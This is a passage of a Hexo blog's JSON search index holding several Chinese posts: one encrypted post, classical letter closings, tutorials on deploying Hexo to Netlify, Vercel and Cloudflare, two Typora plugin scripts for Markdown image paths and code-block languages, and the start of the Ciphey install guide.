2e9c808feecccaaeeae2abc2880e28b4f0320337a8d0b191b3f8a38548adf814a547305d97a07b8d344cbf92db780942596d307beb7d4559aa41a3ae4126960b3475730dca183f3cce96924d7022075ef956ebf5cfda8131b4ac1b6c658f22b4405e00be237ef0a7d40be60ce529803db5b86c29dd96edd5321e7c57493c1eaa89b9948489ef6a9f65328da8bd6aabf68449214fc9dfcd935bc6aaf768a01555f9f2719ac17e74a30592f059269923671159936cbf56fc4d6619f93b8757521bc4fab6054498bfc8aeb3bfb94e7caedaa6dde8b3e11f0e7de7d859d2e8d2ced7a13c91f6aa2c5dfce4c9209cb8e9dc5a47dd08b3103a2090073aec9e56ecf6b5bcb3720294dee8ae32573057d46b45a7905aa25fd7ecd677002b80fea89a72510fa62ae4cd5be7dcbf15df0efc7385929c8f48fc\n  \n    \n      \n      \n        由于本文特殊性，请联系作者获取密码。\n      \n    \n  \n\n\n\nimport {initHBE} from \"/js/plugins/hbe.js\";\n  console.log(\"hexo-blog-encrypt: loaded.\");\n    initHBE();\n\n","categories":["技术教程"],"tags":["QFNU","逆向技术","假条","智慧曲园"]},{"title":"传统书信里的绝美结束语","url":"/posts/ca57bca9.html","content":"\n楮墨有限，不尽欲言。\n我的文化水平有限，想说的话没能全部表达出来。\n\n情长纸短，不尽依依。\n简短的信纸无法写完深长的情意，就不在尽述了。\n\n多劳费心，至纫公谊。\n往后辛苦您多费心了，深深感激你的情谊。\n\n投笔伤情，临书惘惘。\n暂且搁笔，看着写完的书信，心中十分怅惘。\n\n春寒料峭，善自珍重。\n天气虽暖还寒，尚望您自己多加保重。\n\n兹际炎暑，希自珍卫。\n现在正值炎夏酷热之际，希望您保重身体。\n\n秋风萧萧，至祈摄卫。\n秋天天气变凉，真挚的提醒您要保重身体。\n\n渐入寒冬，伏惟珍重。\n渐渐进入寒冷的冬天，希望您多多保重身体。\n\n驰函寓意，伫望示复。\n书信带走我的情意，时时盼望你的回信。\n\n谨付寸心，希垂尺素。\n我的真心尽在信中，期盼能得到您的回信。\n\n拜书以闻，企盼还云。\n我恭敬地写下这封信寄给您，翘首盼望您的回音。\n\n谨遣数行，希还一字\n我在信里给您写了这么多，还望您一定回信。\n\n言不尽思，再祈珍重。\n在信里写不完我的思念，再次希望您能珍重身体。\n\n书未尽情，余候面叙。\n用书信难以充分表达情意，等以后我们见面再说。\n\n故特缕陈，诸希鉴宥。\n我特意细细陈述，希望您察鉴原谅。\n\n聊布往怀，君其详之。\n这封信饱含我们往日情谊，请您仔细考虑这件事。\n\n\n","categories":["文案","优美句子"],"tags":["学习笔记","文案"]},{"title":"使用 Hexo + GitHub + Netlify + Cloudflare提高博客的访问速度","url":"/posts/cb064b79.html","content":"使用 Hexo + GitHub + Netlify + Cloudflare 提高博客的访问速度今天也是看大佬的教程改了自己的配置发现访问速度确实快了许多，遂自己写一份教程加深一些理解。\n\n大佬的教程：https://blog.grin.cool/blog/Hexo-blog#/\n\n\n注意本教程不适合纯 Hexo 小白（其实只要略微了解过一丢丢 Hexo 的就能看懂这篇教程），适合前期有过 GitHub pages 建立经验的进阶用户\n食用本教程若有进不去网站等情况请检查你的代理或者开魔法再进\n\n\n食用本教程请确保\n\n使用过 Hexo 等博客框架，略微了解使用方法\n了解 GitHub，Git 的一些基本操作\n了解 《提问的智慧》 以及 《如何像一个弱智一样提问》\n在没有错误日志下诊断问题无异于闭眼开车\n\n\n首先，本教程相对于 GitHub pages 的优势\n\n本方法不再局限于只有一个仓库可以生成静态页面\n国内访问速度飞快\n每月有 100G 流量带宽额度，300 分钟的构建时间，对于个人博客记录来讲完全够用甚至还余下很多\n静态页面生成速度高于 GitHub pages 至少一倍\nNetlify 可以启用免费的 TLS 证书,启用 HTTPS\n\n\n\n用久了 GitHub pages 发现，在国内的访问速度确实是有点慢，这是因为 GitHub pages 的服务器是在国外，所以在国内访问慢是正常的\n这个方法  不需要云服务器，不需要备案，全部免费 \n也是看到了某大佬的博客才用这种方法 0 成本（时间成本不计入）提高博客访问速度\n需要注意的是，本方法与原先的 GitHub pages 部署方法并不同\n\nGitHub pages 是本地编译然后把编译好的前端页面推送到 GitHub repo\n这里采用的改进方法是直接把 Hexo 源码推送到 GitHub repo，用 Netlify 进行自动编译\n\n这里的好处就是\n\n不占用原来的 github.io 域名，也就是说这两个可以共存\n源码直接在 GitHub repo 仓库里，不用担心数据丢失\n如果换了电脑，可以直接从 GitHub 拉取源码在进行操作\n\n废话不多说直接开始操作\n准备魔法工具（如已有可绕过）工具介绍 这些你都不需要记，看看就行 \n\n虚拟专用网络(Virtual Private Network，VPN)是专用网络的延伸，它包含了类似 Internet 的共享或公共网络链接。通过 VPN 可以以模拟点对点专用链接的方式通过共享或公共网络在两台计算机之间发送数据。\n\n如果说得再通俗一点，VPN 实际上是 “线路中的线路”，类型于城市大道上的 “公交专用线”，所不同的是，由 VPN 组成的 “线路” 并不是物理存在的，而是通过技术手段模拟出来，即是 “虚拟” 的。不过，这种虚拟的专用网络技术却可以在一条公用线路中为两台计算机建立一个逻辑上的专用 “通道”，它具有良好的保密和不受干扰性，使双方能进行自由而安全的点对点连接，因此被网络管理员们非常广泛地关注着。\n\n通过虚拟专用网，我们在家就可以轻松安全的登录到公司的内部网络上，这样可以实现我们在家办公的梦想了。\n\n\n账号注册有了这个工具，你不只是能进 ai，还可以高速浏览 GitHub 等网站，以及…………\n点击下方任意链接跳转注册界面 ↓（有进不去的换一个）\n 链接 1          链接 2             链接 3          链接 4          链接 5         链接 6          链接 7 \n输入邮箱密码注册账号，注册完成后登陆\n\n然后点击左侧购买订阅\n\n根据需求选择你合适的方案，如果你只是想尝鲜的话，毫无疑问，选最便宜的，能用就行\n\n我本人用的是  38.8 巨量不限时，推荐这个 ，大约可以用 2 年左右，平均下来大约 0.6&#x2F;天，而且是实打实的买多少用多少，不会出现超时浪费\n买完之后点击左上方仪表盘可以看到你的已订阅\n\n然后点击仪表盘下方的使用文档\n\n选择你的系统安装客户端\n安装完之后登陆客户端就可以看到这样\n\n连接节点目前为止已经基本结束了，点击连接，点进去选个绿色的节点，点全局， 如果后续出现连接失败就换个节点 \n\nGitHub 操作首先进入 GitHub 建立一个空仓库\n这里仓库名随便写就行，不再被 github.io 限制\n我这里以 blog-Netlify-anzhiyu 为例，公有私有都行，你不想公开源码的话就私有\n\n直接 git clone 刚刚那个 repo\ngit clone 你的仓库地址\n\n然后在目录下初始化 Hexo，由于不是新手向教程，这里不过多赘述\n\n有关于 Hexo 的安装可以看这位大佬的博客 https://akilar.top/posts/6ef63e2d/#/\n\n初始化完成之后，安装你想安装的 Hexo 主题，我这里以 anzhiyu 主题为例\n下面是可供参考的 shell 脚本 一键安装 anzhiyu 主题.sh\nprintf &quot;\\033[32mINFO \\033[0m 正在安装主题...\\n&quot;npm install Hexo-theme-anzhiyuprintf &quot;\\033[32mINFO \\033[0m 主题安装完成\\n&quot;printf &quot;\\033[32mINFO \\033[0m 正在安装依赖...\\n&quot;npm install Hexo-renderer-pug Hexo-renderer-stylus --saveprintf &quot;\\033[32mINFO \\033[0m 依赖安装完成\\n&quot;printf &quot;\\033[32mINFO \\033[0m 正在停顿10s可供查看情况！无异常可Ctrl+C退出\\n&quot;sleep 10s\n\n主题安装完成后别忘了在你的_config.yml 文件里改掉主题，并且复制主题配置到博客根目录\n\n_config.anzhiyu.yml_config.yml\n就是这俩文件\n\n然后改一下 package.json 里面 script 的内容，涉及到后面的参数填写\n// package.json&quot;scripts&quot;: &#123;  &quot;build&quot;: &quot;Hexo generate&quot;,  &quot;clean&quot;: &quot;Hexo clean&quot;,  &quot;server&quot;: &quot;Hexo server&quot;,  &quot;netlify&quot;: &quot;npm run clean &amp;&amp; npm run build&quot;&#125;\n\n然后就可以推送到仓库了\ngit add .git commit -m &quot;deploy from Hexo-admin&quot;git push\n\n可以用 Hexo 命令在本地部署一下看看有没有 bug\nHexo cleanHexo generateHexo s\n\n刷新一下看看有没有推送上去\n\n至此 GitHub 上的操作就告一段落了，继续往下走\nNetlify 操作来到 Netlify 官网\n\n直接以 GitHub 注册便于导入仓库，然后点击继续，等待重定向\n\n然后点击左侧的 site，再点击 new site\n然后点击 Import an existing project\n然后 Deploywith GitHub\n\n然后找到刚刚创建的 repo\n配置就按照我这个来写，注意分支，如果你是 master 填 master，如果你是 main 就填 main\n\n然后点击 deploy\n创建完成之后就可以访问了\n\n如果空白或者是啥也没有，请检查主题配置，一般是主题配置问题\n\n点击左侧的 domain 可以配置域名\n\n点击 add 可以添加自己的域名，点击右侧红框里可以自定义 Netlify 里的子域名\n配置域名以及 cloudflare 的 DNS 配置从第四步开始就需要域名了，没有自己私人域名的可以不用看了\n这里以阿里云域名控制台为例\n首先进控制台 CNAME 指向 Netlify 的域名\n\n然后进入 cloudflare 官网\n\n添加站点，把你自己的域名填上，注意不要带 www.，填纯域名\n比如 www.w1ndys.top 只填 w1ndys.top 就可以\n填写之后会看到让你改 DNS 服务器，我这里已经改过了\n\n这里就去控制台把域名的 DNS 服务器改掉就可以了\n修改之后会等待一段时间审查，一般十分钟左右，但不会超过 24 小时\n审核完之后如图\n\n然后我们进入到 DNS 记录\n\n这里就根据你自己的域名，改成形如我这样的就可以了\n\n到这里已经结束了。\n等待一段时间，访问你自己的域名试试\n\n如有疑问欢迎邮箱私信我 ： &#x77;&#49;&#x6e;&#100;&#x79;&#x73;&#x40;&#x6f;&#x75;&#116;&#108;&#x6f;&#111;&#107;&#46;&#99;&#x6f;&#x6d;\n","categories":["技术教程","Hexo"],"tags":["Github","Hexo","Netlify","Cloudflare"]},{"title":"使用 Netlify，cloudflare pages，GitHub pages , Vercel , Render部署你的 Hexo","url":"/posts/fbbdb8eb.html","content":"使用 Netlify，cloudflare pages，GitHub pages , Vercel, Render部署你的 HexoHexo 博客，在我从一开始的 GitHub pages 转到 Netlify，如今又搭建了 cloudflare，但万变不离其宗，我们没有服务器，没有经济实力支持服务器，于是选择静态部署平台，pages 给我们提供了很好的平台途径，我也是踩了不少的坑，下面将从 Netlify，cloudflare 讲解如何部署。\n首先说明一下用这个方法的好处：\n\nHexo 源码基于 Github 仓库构建\n源码文件全部云端存储\n多设备无缝衔接同步编辑\n四端站点，择优部署\n部署方法基本一致，一通三通\n\n\n前排提醒\n\n本教程适合有 Hexo 搭建基础搭建经验的大佬\n本教程适合有 GitHub 仓库创建经验的大佬\n本教程适合知道如何解决 GitHub 仓库连接问题的大佬（科学上网）\n本教程适合有耐心，知道看完文档再问问题的用户\n如果没了解过 Hexo，没有搭建经验，请移步糖果屋大佬的 Hexo 部署教程\n\n\n前期准备首先在 GitHub 开一个 repo，用来存放你的 Hexo 源码，名字随便填（即有_config.yml 文件的目录内所有文件）\n比如我的（已开源）：\n\nGitHub pages这个我就不提了，用过 Hexo 的基本都是从 GitHub pages 起步的\n如何在 Vercel 部署进入 Vercel 官网\n\n如果进不去，请用魔法\n\n用 Github 登陆\n\n点击 new project\n\n选择你的 Github 存储库，点击 import 导入\n\nVercel 给出了 Hexo 模板，直接默认即可，点击 deploy\n\n等待部署完毕即可，这里可以看日志，部署完毕之后就会自动跳转，一般日志里出现绿色的 info 就基本没什么问题了\n\n成功之后会出现庆祝特效，点击去面板\n\n三个按钮\n\n\n之后点击 add 添加域名\n在你的域名后台添加 CNAME 记录，记录值为 name-china.vercel-dns.com\n等待部署即可\n如何在 Netlify 部署进入 Netlify 官网\n点击中间的 Deploy to Netlify\n\n选择 用GitHub登陆\n\n授权之后找到 添加新站点，再点击 导入存在的项目 由于这里我已经添加过了，界面可能和你的不一样\n\n选择 GitHub\n\n选择你的 repo，这里以我的为例\n\n下面按照我的参数填\n\nsite name 填你的站点地址，假设你填了 xxx，你的站点就是 xxx.netlify.app\nbranch to deploy 就是你的 Github 分支，一般默认是 main\nbase directory 空着\nbuild command 填 默认（npm run build） 的就可以，不要修改\npublish directory 同上（public）\n\n\n完成之后点击绿色的按钮 deploy\n等待 building\n\n状态为 published 之后就部署完成了\n\n点进去看一下，如果你的博客资源比较多的话，首次加载可能比较慢，此处可以挂个科学上网\n\n如何在 cloudflare 上部署进入 cloudflare pages 官网\n右上角登陆，登陆之后\n\n点击左侧的 pages，然后点击 创建应用程序\n\n点击 pages，然后连接到 Git，选择你的 Github 仓库\n\n项目名称 自定义\n构建命令：npm run build\n输出目录：public\n点击构建等待构建即可，步骤与前两个基本类似\n当然这个也支持自定义域名\n如何在 Render 上部署这里先不写了，基本都是一个样的跟之前的\nRender 官网：https://dashboard.render.com/\n\n现在你有四个博客站点了，可以设置一个主站，另外俩当做镜像站\n比如我的\n\n主站：https://blog.w1ndys.top/\nVercel 镜像站：https://v.blog.w1ndys.top/\nNetlify 镜像站：https://n.blog.w1ndys.top/\ncloudflare 镜像站：https://c.blog.w1ndys.top/\nRender 镜像站：https://r.blog.w1ndys.top/\n\n","categories":["技术教程","Hexo"],"tags":["Vercel","Netlify","Cloudflare","Github-pages","Render","blog"]},{"title":"使用Typora_plugin实现Hexo博客绝对路径一键替换相对路径|正斜杠替换为反斜杠","url":"/posts/520cc65.html","content":"使用 Typora_plugin 实现 Hexo 博客绝对路径一键替换相对路径|正斜杠替换为反斜杠今天下午偶然的发现，解决了我很久以来一直想解决的问题，因为在 Hexo 博客上传的时候我一般是把图片插入进去，但是默认的路径是绝对路径，曾经在 Typora 设置里改过，但是效果也不好，今天想起了 Typora plugin，于是想基于 Typora plugin 开发一个插件\n首先感谢 Typora plugin 开发者 https://github.com/obgnail/typora_plugin/\n真心感谢插件开发大佬😭😭😭😭😭😭😭😭😭😭😭\n我把问题抛给大佬，大佬轮子都给我造好了，而且还有礼貌，我说我写个安装文档提供给其他有需要的用户使用，他甚至还麻烦我\n\n\n\n\n\n脚本适用情况该脚本主要实现功能是，Markdown 中所有的图片路径中正斜杠一键替换为反斜杠，并把包含..&#x2F;images&#x2F;的路径替换为相对路径，方便 Hexo 博客上传\n例如 Markdown 中文件路径是 [示例图片](F:/Hexo/source../images/test.png)\n替换后的路径就是 [示例图片](../images/test.png)\n本脚本适用于：Hexo 博客写作排版，Hexo 图片放在&#x2F;source&#x2F;文件下的 Hexo 博客作者\n安装 Typora plugin有关插件的安装教程可以看官方的仓库，Readme 写的很详细了\nhttps://github.com/obgnail/typora_plugin/\n创建 JS在 ./plugin/custom/plugins/ReplaceBackslash.js 文件中创建 js 文件，把下面代码复制进去。\nclass ReplaceBackslash extends BaseCustomPlugin &#123;    hotkey = () =&gt; [this.config.hotkey]    callback = async anchorNode =&gt; &#123;        const filepath = this.utils.getFilePath();        const content = await this.utils.Package.Fs.promises.readFile(filepath, &#x27;utf-8&#x27;);        const replacedContent = await this.format(content);        await this.utils.Package.Fs.promises.writeFile(filepath, replacedContent);        File.reloadContent(replacedContent, &#123; fromDiskChange: false &#125;);    &#125;    format = async content =&gt; &#123;        const dir = this.utils.getCurrentDirPath();        const imgFolder = this.config.img_folder;        const regexp = this.config.ignore_image_div            ? new RegExp(&quot;!\\\\[.*?\\\\]\\\\((?&lt;src1&gt;.*)\\\\)&quot;, &quot;g&quot;)            : new RegExp(&quot;!\\\\[.*?\\\\]\\\\((?&lt;src1&gt;.*)\\\\)|&lt;img.*?src=\\&quot;(?&lt;src2&gt;.*?)\\&quot;&quot;, &quot;g&quot;);        return await this.asyncReplace(content, regexp, async (match, src1, src2) =&gt; &#123;            const src = src1 || src2;            // 跳过特殊格式的图片（如base64）和网络图片            if (!src || this.utils.isSpecialImage(src) || this.utils.isNetworkImage(src)) return match;            // 检测图片是否存在于当前电脑中，若不存在，则不处理            // 如果不希望检测，可以注释掉下面两行            const realPath = await this.checkImageExist(dir, src);            if (!realPath) &#123;                // 如果路径中没有反斜杠，则检查是否位于指定的 img 文件夹中                if (!src.includes(&#x27;\\\\&#x27;) &amp;&amp; !src.includes(&#x27;/&#x27;)) &#123;                    const imgPath = this.utils.Package.Path.resolve(dir, imgFolder, src);                    if (await this.utils.existPath(imgPath)) &#123;                        // 如果图片存在于指定的 img 文件夹中，则返回处理后的路径                        return this.replaceBackslash(match, src, imgPath);                    &#125;                &#125;                // 如果路径中无反斜杠并且不在指定的 img 文件夹中，则保持原样                return match;            &#125;            // 进行路径替换并处理反斜杠            return this.replaceBackslash(match, src, realPath);        &#125;);    &#125;    // 替换路径逻辑    replaceBackslash = (match, src, realPath) =&gt; &#123;        // 将路径中的反斜杠 \\ 替换为斜杠 /        const replacedSrc = realPath.replace(/\\\\/g, &#x27;/&#x27;);        const index = match.indexOf(src);        return match.slice(0, index) + match.slice(index).replace(src, replacedSrc);    &#125;    asyncReplace = (content, regexp, placement) =&gt; &#123;        let match;        let lastIndex = 0;        const promises = [];        while ((match = regexp.exec(content))) &#123;            const str = content.slice(lastIndex, match.index);            lastIndex = regexp.lastIndex;            const args = [match[0], match.groups?.src1, match.groups?.src2, match.index, match.input];            const promise = placement(...args);            promises.push(str, promise);        &#125;        promises.push(content.slice(lastIndex));        return Promise.all(promises).then(results =&gt; results.join(&quot;&quot;));    &#125;    checkImageExist = async (currentDir, path) =&gt; &#123;        let absolutePath = this.utils.Package.Path.resolve(currentDir, path);        while (!(await this.utils.existPath(absolutePath))) &#123;            const idx = absolutePath.lastIndexOf(&quot;)&quot;);            if (idx === -1) &#123;                return null;            &#125; else &#123;                absolutePath = absolutePath.slice(0, idx);            &#125;        &#125;        return absolutePath;    &#125;&#125;module.exports = &#123; plugin: ReplaceBackslash &#125;;\n\n启用插件\n修改 ./plugin/global/settings/custom_plugin.user.toml，添加配置：\n\n[ReplaceBackslash]name = &quot;替换反斜杠为正斜杠&quot;enable = true[ReplaceBackslash.config]# 是否忽略html标签&lt;img src=&quot;example.jpg&quot;&gt;里的资源（markdown是支持插入html的，此选项问是否要忽略img标签）ignore_image_div = falseimg_folder = &quot;img&quot;          #这里引号内的内容改为你自己的文件夹命名\n\n这里引号内的内容改为你自己的文件夹命名\n添加快捷方式添加快捷键修改 ./plugin/global/settings/custom_plugin.user.toml，添加配置\n在上一步的基础上，继续添加一行代码\n[ReplaceBackslash.config]# 是否忽略html标签&lt;img src=&quot;example.jpg&quot;&gt;里的资源（markdown是支持插入html的，此选项问是否要忽略img标签）ignore_image_div = falseimg_folder = &quot;img&quot;# 快捷键（若为&quot;&quot;，则不注册）hotkey = &quot;ctrl+shift+m&quot;\n\n这里快捷键设置为 ctrl+shift+m 可以根据自己需要修改\n添加快捷按钮在上一步的基础上，继续添加代码\n[quickButton][quickButton.config]#   disable:      禁用此按钮#   coordinate:   按钮坐标。往上为x轴正方向，往左为y轴正方向，从零开始计数#   icon:         按钮图标。填入css class。支持font-awesome-4.1.0和ionicons-2.0.1，所有的图标及其对应的css class请参考：https://www.adfwebmagazine.jp/wp-content/uploads/test_v4.1.pdf  和  https://ionic.io/ionicons/v2#   size(可选):    图标大小。默认17px#   color(可选):   图标颜色。默认跟随当前主题的配色方案#   bgColor(可选): 图标背景色。默认跟随当前主题的配色方案#   hint:         提示信息#   callback:     回调函数。采用pluginName.MethodName的形式（功能就像hotkey.default.toml中的plugin参数和function参数的合体）#                     MethodName请通过阅读源码查找。如果您不懂代码，但还是想添加按钮，有个碰运气技巧：在【右键菜单-&gt;常用插件-&gt;自定义插件下的插件】基本都是XXX.callback，其余插件基本都是XXX.call#   evil(危险):    自定义回调函数。功能同hotkey.default.toml中的evil参数（它能用的，这里也能用）。这里的文本内容会被eval()。如果设置此参数，callback参数会失效buttons = [    # 默认的按钮    &#123; disable = false, coordinate = [0, 0], hint = &quot;直达底部&quot;, size = &quot;28px&quot;, icon = &quot;fa fa-angle-down&quot;, callback = &quot;go_top.goBottom&quot; &#125;,    &#123; disable = false, coordinate = [1, 0], hint = &quot;直达顶部&quot;, size = &quot;28px&quot;, icon = &quot;fa fa-angle-up&quot;, callback = &quot;go_top.goTop&quot; &#125;,    &#123; disable = false, coordinate = [2, 0], hint = &quot;文字风格&quot;, size = &quot;17px&quot;, icon = &quot;fa fa-font&quot;, callback = &quot;text_stylize.call&quot; &#125;,    &#123; disable = false, coordinate = [3, 0], hint = &quot;混排优化&quot;, size = &quot;17px&quot;, icon = &quot;fa fa-align-justify&quot;, callback = &quot;md_padding.call&quot; &#125;,    &#123; disable = false, coordinate = [0, 1], hint = &quot;思维导图&quot;, size = &quot;22px&quot;, icon = &quot;fa fa-code-fork&quot;, callback = &quot;markmap.onButtonClick&quot; &#125;,    &#123; disable = false, coordinate = [1, 1], hint = &quot;图片管理&quot;, size = &quot;17px&quot;, icon = &quot;fa fa-image&quot;, callback = &quot;imageReviewer.callback&quot; &#125;,    &#123; disable = false, coordinate = [2, 1], hint = &quot;书签管理&quot;, size = &quot;17px&quot;, icon = &quot;fa fa-bookmark&quot;, callback = &quot;scrollBookmarker.callback&quot; &#125;,    &#123; disable = false, coordinate = [3, 1], hint = &quot;高亮搜索&quot;, size = &quot;17px&quot;, icon = &quot;fa fa-search&quot;, callback = &quot;search_multi.call&quot; &#125;,    # 你的按钮    &#123; disable = false, coordinate = [4, 1], hint = &quot;正斜杠替换斜杠&quot;, size = &quot;17px&quot;, icon = &quot;fa fa-book&quot;, callback = &quot;ReplaceBackslash.callback&quot; &#125;,]\n\n重启 Typora 就可以在右下角看到添加的快捷按钮\n效果展示\n更新日志2024 年 2 月 8 日 ， 修了一处没有考虑到的 bug，原先只能转换绝对路径，对于（….&#x2F;images&#x2F;）形式的路径不会处理，修复后也包括了这种情况，具体改动可以查看编辑历史\n2024 年 2 月 8 日 ，重写了代码逻辑，改为先进行反斜杠替换，然后进行路径重写为相对路径\n2024 年 2 月 8 日 ，增加了一个实现效果 GIF 演示\n2024 年 2 月 8 日 ，受作者启发，将代码中硬编码的 ..&#x2F;images&#x2F; 改成一个配置选项，脚本使用者可以根据自己需要修改配置变量的内容\n2024 年 2 月 9 日 ，代码已更新，经过作者的施教，增强了图片路径的匹配，解决了原先替换全文\\的问题，现在只替换图片路径，插件作者太强了\n如图\n\n\n2024 年 2 月 10 日，大佬帮忙抓虫，纠正了快捷键的配置\n2024 年 2 月 18 日，大佬指出错误，修改了快捷键的错误\n鸣谢感谢 Typora_plugin 作者，极大地方便了我的写作\n感谢 ChatGPT，给了我代码写作的开头\n\nhttps://github.com/obgnail/typora_plugin/issues/467\nhttps://w1ndys.top/\nhttps://chat.openai.com/\n\n\n文章来自 https://blog.w1ndys.top/posts/520cc65\n","categories":["技术教程","Typora"],"tags":["Hexo","Typora","Typora-plugin"]},{"title":"使用Typora_plugin实现Markdown代码块一键填充指定编程语言","url":"/posts/979ed90f.html","content":"使用 Typora_plugin 实现 Markdownd 代码块一键填充指定编程语言轮子首先感谢大佬写好的轮子\n使用的时候请把里面的 plugin_name 改为插件的实际文件名\nclass plugin_name extends BaseCustomPlugin &#123;    callback = async anchorNode =&gt; &#123;        const filepath = this.utils.getFilePath();        const content = await this.utils.Package.Fs.promises.readFile(filepath, &#x27;utf-8&#x27;);        const replacedContent = this.plugin_name(content);        await this.utils.Package.Fs.promises.writeFile(filepath, replacedContent);        File.reloadContent(replacedContent, &#123;fromDiskChange: false&#125;);    &#125;    // 在这里写主要的逻辑代码    plugin_name = content =&gt; &#123;          &#125;&#125;module.exports = &#123; plugin: plugin_name &#125;;\n\n安装 Typora plugin有关插件的安装教程可以看官方的仓库，Readme 写的很详细了\nhttps://github.com/obgnail/typora_plugin/\n创建 JS在 ./plugin/custom/plugins/ 文件中创建 MarkdownToCode.js 文件，把下面代码复制进去。\n// ./plugin/custom/plugins/markdownToCode.jsclass MarkdownToCode extends BaseCustomPlugin &#123;    callback = async anchorNode =&gt; await this.utils.editCurrentFile(this.convertMarkdownToCode)    // 主要逻辑代码    convertMarkdownToCode = content =&gt; &#123;        const components = [&#123; label: &quot;语言&quot;, type: &quot;input&quot;, value: this.config.code.toLowerCase() &#125;];        this.utils.modal(&#123; title: &quot;添加语言&quot;, components &#125;, async ([&#123; submit: targetLang &#125;]) =&gt; &#123;            if (!targetLang) return;            const updatedContent = this.updateCodeLanguage(content, targetLang.toLowerCase());            const filepath = this.utils.getFilePath();            await this.utils.Package.Fs.promises.writeFile(filepath, updatedContent);            File.reloadContent(updatedContent, &#123; fromDiskChange: false &#125;);        &#125;)    &#125;    // 更新代码块语言    updateCodeLanguage = (content, targetLang) =&gt; &#123;        const codeBlockRegex = /```(?:\\w+)?\\s*([\\s\\S]+?)\\s*```/g; // 匹配代码块，包括语言指定部分        const updatedContent = content.replace(codeBlockRegex, (match, codeContent) =&gt; &#123;            // 匹配到的完整代码块            const codeLanguageMatch = match.match(/```(\\w+)?/); // 匹配代码块语言指定部分            const codeLanguage = codeLanguageMatch ? codeLanguageMatch[1] : null; // 获取代码块语言            // 如果语言未指定或者不是目标语言，则添加目标语言标记            if (!codeLanguage || codeLanguage.toLowerCase() !== targetLang) &#123;                return &#x27;```&#x27; + targetLang + &#x27;\\n&#x27; + codeContent + &#x27;\\n```&#x27;;            &#125;            return match; // 代码块已经指定为目标语言，不需要修改        &#125;);        return updatedContent;    &#125;&#125;module.exports = &#123; plugin: MarkdownToCode &#125;;\n\n启用插件\n修改 ./plugin/global/settings/custom_plugin.user.toml，添加配置：\n\n[MarkdownToCode]name = &quot;标注全部代码块&quot;  # 右键菜单中展示的名称enable = true         # 是否启用此自定义插件hide = true           # 是否在右键菜单中隐藏order = 1             # 在右键菜单中的出现顺序（越大越排到后面，允许负数）    [MarkdownToCode.config]    code = &quot;python&quot; ##这里引号内改为你想要格式化的编程语言\n\n这里引号内的内容改为你想要格式化的编程语言\n添加快捷按钮修改 ./plugin/global/settings/custom_plugin.user.toml，添加配置\n[quickButton][quickButton.config]#   disable:      禁用此按钮#   coordinate:   按钮坐标。往上为x轴正方向，往左为y轴正方向，从零开始计数#   icon:         按钮图标。填入css class。支持font-awesome-4.1.0和ionicons-2.0.1，所有的图标及其对应的css class请参考：https://www.adfwebmagazine.jp/wp-content/uploads/test_v4.1.pdf  和  https://ionic.io/ionicons/v2#   size(可选):    图标大小。默认17px#   color(可选):   图标颜色。默认跟随当前主题的配色方案#   bgColor(可选): 图标背景色。默认跟随当前主题的配色方案#   hint:         提示信息#   callback:     回调函数。采用pluginName.MethodName的形式（功能就像hotkey.default.toml中的plugin参数和function参数的合体）#                     MethodName请通过阅读源码查找。如果您不懂代码，但还是想添加按钮，有个碰运气技巧：在【右键菜单-&gt;常用插件-&gt;自定义插件下的插件】基本都是XXX.callback，其余插件基本都是XXX.call#   evil(危险):    自定义回调函数。功能同hotkey.default.toml中的evil参数（它能用的，这里也能用）。这里的文本内容会被eval()。如果设置此参数，callback参数会失效buttons = [    # 默认的按钮    &#123; disable = false, coordinate = [0, 0], hint = &quot;直达底部&quot;, size = &quot;28px&quot;, icon = &quot;fa fa-angle-down&quot;, callback = &quot;go_top.goBottom&quot; &#125;,    &#123; disable = false, coordinate = [1, 0], hint = &quot;直达顶部&quot;, size = &quot;28px&quot;, icon = &quot;fa fa-angle-up&quot;, callback = &quot;go_top.goTop&quot; &#125;,    &#123; disable = false, coordinate = [2, 0], hint = &quot;文字风格&quot;, size = &quot;17px&quot;, icon = &quot;fa fa-font&quot;, callback = &quot;text_stylize.call&quot; &#125;,    &#123; disable = false, coordinate = [3, 0], hint = &quot;混排优化&quot;, size = &quot;17px&quot;, icon = &quot;fa fa-align-justify&quot;, callback = &quot;md_padding.call&quot; &#125;,    &#123; disable = false, coordinate = [0, 1], hint = &quot;思维导图&quot;, size = &quot;22px&quot;, icon = &quot;fa fa-code-fork&quot;, callback = &quot;markmap.onButtonClick&quot; &#125;,    &#123; disable = false, coordinate = [1, 1], hint = &quot;图片管理&quot;, size = &quot;17px&quot;, icon = &quot;fa fa-image&quot;, callback = &quot;imageReviewer.callback&quot; &#125;,    &#123; disable = false, coordinate = [2, 1], hint = &quot;书签管理&quot;, size = &quot;17px&quot;, icon = &quot;fa fa-bookmark&quot;, callback = &quot;scrollBookmarker.callback&quot; &#125;,    &#123; disable = false, coordinate = [3, 1], hint = &quot;高亮搜索&quot;, size = &quot;17px&quot;, icon = &quot;fa fa-search&quot;, callback = &quot;search_multi.call&quot; &#125;,    # 你的按钮    &#123; disable = false, coordinate = [4, 0], hint = &quot;一键标注所有代码块&quot;, size = &quot;17px&quot;, icon = &quot;fa fa-code&quot;, callback = &quot;MarkdownToCode.callback&quot; &#125;,]\n\n重启 Typora 就可以在右下角看到添加的快捷按钮\n效果展示\n\n鸣谢感谢 Typora_plugin 作者，极大地方便了我的写作\n感谢 ChatGPT，给了我代码写作的开头\n\nhttps://github.com/obgnail/typora_plugin/\nhttps://w1ndys.top/\nhttps://chat.openai.com/\n\n","categories":["技术教程","Typora"],"tags":["Hexo","Typora","Typora-plugin"]},{"title":"全自动解密脚本Ciphey官方安装文档","url":"/posts/bc236d8e.html","content":"Python 3.7 and aboveOn Linux run this command:\npython3 -m pip install ciphey --upgrade\n\n\n\nThis will tell your default Python3 version to install Ciphey and upgrade it if it already exists.\nCiphey only supports Python3.7 and above. Please upgrade Python or use the Docker image if you have a version below 3.7.\n⚠️ Ciphey doesn’t work on Windows with Python 3.9+, use Python 3.7 or Python 3.8. Other platforms are fine with Python 3.9, Python 3.10 doesn’t work.\n⚠️ Windows Python defaults to install 32-bit. Ciphey only supports 64-bit. Make sure you’re using 64-bit Python.\nDockerSee here for how to install Docker\ndocker run -it --rm remnux/ciphey\n\n\n\nOur Docker image is maintained by REMnux. They have provided a guide on how to use it here. https://docs.remnux.org/run-tools-in-containers/remnux-containers#ciphey\nDetailed Explanation for Python InstallationTo install Ciphey, you need 2 core things:\n\nPython3.7 or above\nPip (on Python 3)\n\nCheck to see if Python is already installed. Run both of these commands:\npython -c &quot;import sys; print(sys.version)&quot;\n\n\n\nAnd&#x2F;or\npython3 -c &quot;import sys; 